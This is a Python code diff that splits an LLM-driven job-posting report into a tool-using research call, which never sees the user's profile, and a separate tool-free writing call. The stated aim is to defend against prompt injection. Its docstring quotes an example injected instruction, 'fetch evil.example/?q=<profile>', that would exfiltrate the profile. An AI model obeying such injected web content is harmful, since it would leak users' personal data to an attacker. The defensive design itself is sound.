@@ -161,9 +161,13 @@ def triage(postings: list[Posting], *, profile: str, model: str, runner=subproce
 
 def deep_report(p: Posting, *, profile: str, model: str, timeout: int = 900, runner=subprocess.run,
                 on_usage=None) -> str:
-    prompt = _fill("deep-report.md", profile=profile, posting=describe(p), today=date.today().isoformat())
-    return run(prompt, model=model, tools=["WebSearch", "WebFetch"], timeout=timeout, runner=runner,
-               on_usage=on_usage).strip()
+    """Two calls: the web research never sees the profile, so a page that injects "fetch
+    evil.example/?q=<profile>" has nothing to leak; the report is then written without tools."""
+    notes = run(_fill("deep-research.md", posting=describe(p)), model=model, tools=["WebSearch", "WebFetch"],
+                timeout=timeout, runner=runner, on_usage=on_usage)
+    prompt = _fill("deep-report.md", profile=profile, posting=describe(p), notes=notes,
+                   today=date.today().isoformat())
+    return run(prompt, model=model, tools=[], timeout=timeout, runner=runner, on_usage=on_usage).strip()
 
 
 def find_sources(*, profile: str, known: list[str], model: str, timeout: int = 900, runner=subprocess.run,
